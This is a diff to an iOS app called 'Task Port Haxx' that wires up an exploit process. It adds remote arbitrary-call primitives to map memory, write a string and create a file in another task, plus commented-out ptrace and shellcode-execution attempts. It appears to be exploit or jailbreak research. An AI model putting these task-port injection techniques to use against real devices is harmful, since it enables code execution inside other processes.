@@ -11,7 +11,7 @@
 
 @interface ViewController ()
 @property(nonatomic) mach_port_t exceptionPort;
-@property(nonatomic) pid_t childPid;
+@property(nonatomic) pid_t childPid, sleepPid;
 @property(nonatomic) UITextView *logTextView;
 @end
 
@@ -21,11 +21,13 @@
     [super viewDidLoad];
     self.exceptionPort = setup_exception_server();
     self.childPid = -1;
+    self.sleepPid = spawn_sleep_process();
     
     self.navigationItem.title = @"Task Port Haxx";
     self.navigationItem.rightBarButtonItems = @[
         [[UIBarButtonItem alloc] initWithTitle:@"Test" style:UIBarButtonItemStylePlain target:self action:@selector(testButtonTapped)],
-        [[UIBarButtonItem alloc] initWithTitle:@"Arb Call" style:UIBarButtonItemStylePlain target:self action:@selector(arbCallButtonTapped)]
+        [[UIBarButtonItem alloc] initWithTitle:@"Arb Call" style:UIBarButtonItemStylePlain target:self action:@selector(arbCallButtonTapped)],
+        [[UIBarButtonItem alloc] initWithTitle:@"Detach" style:UIBarButtonItemStylePlain target:self action:@selector(detachButtonTapped)]
     ];
         
     
@@ -72,21 +74,34 @@
         printf("Child already spawned with PID %d\n", self.childPid);
         return;
     }
-    self.childPid = child_spawn();
+    self.childPid = spawn_exploit_process(self.exceptionPort);
 }
 
 - (void)arbCallButtonTapped {
-    kern_return_t kr;
-    printf("Task port: %d, thread port: %d\n", GlobalChildTaskPort, GlobalChildThreadPort);
-    task_suspend(GlobalChildTaskPort);
-    
-    arm_thread_state64_t state = {0};
-    mach_msg_type_number_t stateCount = ARM_THREAD_STATE64_COUNT;
-    kr = thread_get_state(GlobalChildThreadPort, ARM_THREAD_STATE64, (thread_state_t)&state, &stateCount);
-    printf("thread_get_state returned: %s\n", mach_error_string(kr));
-    for (int i = 0; i < sizeof(state.__x)/sizeof(state.__x[0]); i++) {
-        printf("x%d = 0x%llX\n", i, state.__x[i]);
-    }
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        
+        vm_address_t map = RemoteArbCall(mmap, 0, 0x4000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
+        printf("Mapped memory at 0x%llx\n", map);
+        RemoteWriteString(map, "/tmp/.it_works");
+        RemoteArbCall(mkdir, map, 0700);
+        // Can't JIT :(
+//        void *ptrace = dlsym(RTLD_DEFAULT, "ptrace");
+//        RemoteArbCall(ptrace, PT_ATTACHEXC, self.sleepPid, 0, 0);
+//        RemoteArbCall(ptrace, PT_DETACH, self.sleepPid, 0, 0);
+//        uint32_t shellcode[] = {
+//            0xd2808880, // mov x0, #0x444
+//            0xd65f03c0 // ret
+//        };
+//        RemoteWriteMemory(map, shellcode, sizeof(shellcode));
+//        RemoteArbCall(mprotect, map, 0x4000, PROT_READ | PROT_EXEC);
+//        _tmp_ptr = (uint64_t)map;
+//        RemoteArbCall(((uint64_t (*)(void))map));
+        RemoteArbCall(munmap, map, 0x4000);
+    });
+}
+
+- (void)detachButtonTapped {
+    wantsDetach = YES;
 }
 
 - (void)alertWithTitle:(NSString *)title message:(NSString *)message {
